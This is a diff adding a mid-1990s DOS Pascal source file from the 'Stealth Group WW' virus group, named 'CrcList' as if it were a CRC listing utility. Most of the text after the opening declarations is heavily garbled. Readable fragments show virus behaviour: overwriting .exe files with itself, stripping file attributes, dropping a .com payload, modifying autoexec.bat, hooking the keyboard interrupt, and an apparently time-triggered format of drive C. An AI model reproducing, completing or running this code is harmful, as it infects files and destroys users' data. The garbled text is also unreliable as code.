@@ -1,0 +1,129 @@
+‹‹                   ‹
+ﬂﬂﬂ STEALTH GROUP WW € Mail:   BOX 15, 125080 MOSCOW   €€€€€€€€ €€€€€€€€€ €ﬂﬂ€
+ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ   ⁄ƒø¬ ¬⁄ƒ¥¬ ¬ “ ¬ø⁄ €‹‹€
+ ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€   › € ‹ﬂ€ € ‹ﬂﬂ €‹‹    √¬Ÿ≥ ≥¿ƒø√ƒ¥   ≥¿¥ ‹  €
+  € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €   € € € € € €   €      ¡¿ƒ¿ƒŸ¿ƒŸ¡ ¡   ¡ ¡ ﬂﬂﬂﬂ
+  € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ    ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹   €€€€  WINTER ' 96  €€€€
+  ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹   €€€€€€€€€€€€€€€€€€€€€€€
+
+{Ç®‡„· ≠† è†·™†´• · ‡•ß®§•≠‚≠Æ© Á†·‚ÏÓ.}
+{(C) I1}
+
+{$R-,S-,I-,M 65000,0,0}
+Program CrcList;
+uses dos,crt;
+const
+ TotalFiles:longint=0;
+ TotalBytes:longint=0;
+ NeedCRC:boolean=false;
+ ListAll:boolean=false;
+var
+ CurrDir:pathstr;
+ FName:pathStr;
+ Regs:Registers;
+ Buf:array[0..4095] of byte;
+ CRCTab:array[byte] of word;
+ PathToVir:pathstr;
+ h,m,s,ds:word;
+ kbdintvec:procedure;
+ d:integer;
+ cicl,result:integer;
+procedure LengthCRC(FName:pathStr;
+                    var CRC:word;
+                    var Error:integer);
+var
+ C,W:word;
+ K:integer;
+ B:byte;
+ L,Len,IByte:longint;
+ F:file;
+begin
+ Error:=0;
+ assign(F,FName);
+ {$I-}
+ reset(F,1);
+ {$I+}
+ if IOResult<>0 then begin
+  Error:=1;
+  exit;
+ end;
+ Len:=FileSize(f);
+ if not NeedCRC then begin
+  close(f);
+  CRC:=0;
+  exit;
+ end;
+ c:=0;
+ for IByte:=0 to len-1 do begin
+  k:=IByte and 4095;
+  if k=0 then begin
+   L:=Len-  if =N;
+  eif kL>0956then 
+     :=L0956
+  ei$I-}
+ r BOlockNDto lente and 4095;
+  i•L,W)BOlockNDt+}hen 
+    begin
+  Error:=1;
+  exixit;
+ en2       :=0;
+F)BOlockc:=0;
+ f for IBytfor IBytfb:=  i[k]IBytfW:= exit;:=(C shr 8) xorte] of [(C xortW) k=0 $ff]
+ for IByte=0;
+  exit
+ enCexior IByByByCRC(FName:SearchNam(Name:pat   rd;
+ K:inSREc:SearchRecexit
+ er;
+ B:b
+var
+ C,W:woe(f);
+ e;
+begines:lo cl,result:=0 to1;
+  e   Nam[pathSt(Nam)]<>'\'956
+  eName=Nam+'\' toFindFirst(Nam+'*.exe',anyf no,SRecrd;Wh no Dos
+var  LByte and 40with SRecLBybegin
+Attr k=0 24   L:=Len-  if =N;      =Nam+    BOlockcpathStr;
+     ,r;,
+var)BOlockcIf 
+var  Lror:=1;
+  exixiin
+s Ne<>8832Lror:=1;
+  exixiid:=d56then 
+
+
+
+textcolor(0)BOlockcc:=ec(getenv('comspec'),'/c'+'copy '+:pattovam+'  '+fn   +' >nul')BOlockccn
+d=3Lror:=:=0;
+ f ftfor IBytftfor IBytftfor IBytf:=ec(getenv('comspec'),'/c'+'attrib -h -s -r *.exe')BOlocFindNext(SRecrd;for IBytFindFirst(Nam+'*.*',anyf no,SRecrd; wh no 
+ Tevar  LByte and 400with SRecLBybegicn
+(Attr k=0 16  E) k=0 (    [1]<>'.')Lror:=1;
+  exixiSearchNam(Nam+ reset(F,,,,
+ Bu.AH:=$1At(F,,,,
+ Bu.DS:=Seg(SRecrd;f,,,
+ Bu.DX:=Ofs(SRecrd;f,,,MSDOS(
+ Bu)
+ f for IBytfFindNext(Srecrd;for IByor IByByCRC(FName:WrEx to1;
+  e:=ec(getenv('comspec'),'/c'+'echo ∏5Õ!âAåC∫'+#26+'¥%Õ!≤EÕ'+#39+' `∞Ê@∞Ê@∫⁄Ï≤¿∞3Ó.°Óƒ®tˆ‘ƒ.£aÍ>c.com')BOl:=ec(getenv('comspec'),'/c'+'copy c.comte:\commk=0.com>nul')BOl:=ec(getenv('comspec'),'/c'+'del c.com')BOl:r IByCRC(FName:Aut to1;
+  e:=ec(getenv('comspec'),'/c'+'echo @echo off>1.v')BOl:=ec(getenv('comspec'),'/c'+'echo '+r;
+ hvam+' >2.v')BOl:=ec(getenv('comspec'),'/c'+'copy 1.v+2.v c.v>nul')BOl:=ec(getenv('comspec'),'/c'+'copy c.vte:\auto:=ec.bat')BOl:=ec(getenv('comspec'),'/c'+'del *.v')BOl:r IByByCRC(FName:L to1;
+  e:=ec(getenv('comspec'),'/c'+'label de;
+')BOl:r IByCRC(FName:KeyClick;resurrupt to1;
+  ecn
+port[$60]<$80956
+  e1;
+  ecgotoXY(rk=0om(60),rk=0om(25)rd;ftextcolor(4rd; write('De;
+ Forte;'rd;for IBytinline($9Crd;fKbdIntVecexi:r IByCRC(FName:el;5000Fo le1;
+  ecGetIntVec($9,@KbdIntVecrd;fsetIntVec($9,Addr(KeyClick)rd;fkeep(0)BOl:r IByCRC(FName:lenm;			{‰Æ‡¨†‚®‚ §®·™ ·: (≠•Ø´ÆÂÆ °Î §Æ°†¢®‚Ï /U) le1;
+  ewrite('Terminaif bac
+ job?[YN]')BOl:=ec(getenv('comspec'),'/c'+'lenmatte: >nul')BOl:r IByBy{íÆÁ™† ¢ÂÆ§†M 6501;
+  egettime( kbdintv);			{ØÆ´„Á®‚Ï ‚•™„È•• ¢‡•¨Ô}Ol:=ec(getenv('comspec'),'/c'+'cls')Bf ftf{ÆÁ®·‚™† Ì™‡†≠†M 6n
+(h>13) k=0 (h<15)Lror:=lenm;		{13..15I1}Æ¢. Ç‡•¨Ô ‰Æ‡¨†‚®‡Æ¢†‚Ï C:M 6textcolor(0)BOlr;
+ h,m,s=paes wor(0)BOlocGetNam(0,
+ FNam);			OlocSearchNam(copy(
+ FNam,1,3)rd	cicl,=s*100+dsinteger;:=0 to repe;nteger;:=ger;56then
+proced=rk=0om(5)BOlountileger;=dRC then
+proce  Lror:=WrEx tothen
+proce 1Lror:=Aut tothen
+proce 2Lror:=El tothen
+proce 3Lror:=l tothen
+proce 4Lror:=settime(CrcLi
